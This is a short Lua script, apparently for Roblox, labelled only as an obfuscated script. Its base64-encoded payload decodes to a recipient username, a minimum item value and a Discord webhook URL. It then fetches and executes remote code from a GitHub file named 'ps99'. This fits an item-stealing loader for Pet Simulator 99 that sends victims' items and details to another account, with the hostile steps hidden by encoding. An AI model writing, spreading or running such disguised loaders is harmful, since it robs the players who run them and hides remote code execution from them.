
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gImp1bHNjbW9pMSIKVXNlcm5hbWUyID0gImp1bHNjbW9pMSIKTWluaW11bVJBUCA9IDEKV2ViaG9vayA9ICJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMzYxNzMzNDI1MjQwODY2OTM4L3FMNlVlaU5VNzlkNXlYUXpSdXJ5T3Q2X3VManl4bkJnWDVDMm1EY1NIZkc5RUJGWkVuTnVpOXFZUjRiaERwbmVDdHJrIgoKbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9wczk5IiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()